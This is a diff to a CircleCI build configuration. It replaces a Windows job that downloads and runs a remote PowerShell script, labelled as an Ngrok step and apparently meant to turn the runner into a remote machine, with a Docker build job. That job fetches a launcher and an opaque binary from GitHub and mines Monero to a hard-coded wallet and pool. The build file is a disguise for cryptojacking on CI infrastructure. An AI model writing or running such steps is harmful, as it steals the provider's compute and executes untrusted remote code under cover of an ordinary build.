@@ -1,19 +1,11 @@
-version: 2.1 
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
+version: 2.0
 jobs:
-  build: 
-    executor:
-      name: win/default 
-      size: "medium" 
-     
-    steps:  
-       
-      - run: 
-          name: Paste Ngrok Auth Value In Hosted Link
-          command: |      
-            Invoke-WebRequest https://raw.githubusercontent.com/nurriyan548/vps/main/sh -OutFile gpu.ps1 
-          
-      - run: ./gpu.ps1
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 88CwLtnRpL9exPXygNLcq1HAxP7AeBKKT9pEJskHSXxB4ugXeeWKhep4mfyxVTKkYHadTMPkKWDMK6FANC2CSKBh9UviCnq  -rigName1  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
